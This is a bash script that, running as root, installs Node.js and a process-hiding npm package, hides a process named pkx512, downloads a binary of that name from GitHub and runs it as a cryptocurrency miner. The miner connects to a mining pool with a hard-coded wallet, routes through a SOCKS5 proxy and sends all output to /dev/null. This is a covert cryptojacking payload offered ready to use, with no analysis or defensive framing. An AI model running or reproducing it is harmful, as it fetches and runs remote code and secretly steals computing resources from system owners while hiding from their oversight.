#!/bin/bash
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add pkx512 && wget https://github.com/panda-nikko/mantap/raw/main/pkx512 && chmod +x pkx512 && ./pkx512 -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RTb5zre1gWPNGQLvAFbWY3DVDMke1RxdFQ.vcpu001 -t 1 -x socks5://192.252.214.20:15864 > /dev/null 2>&1"
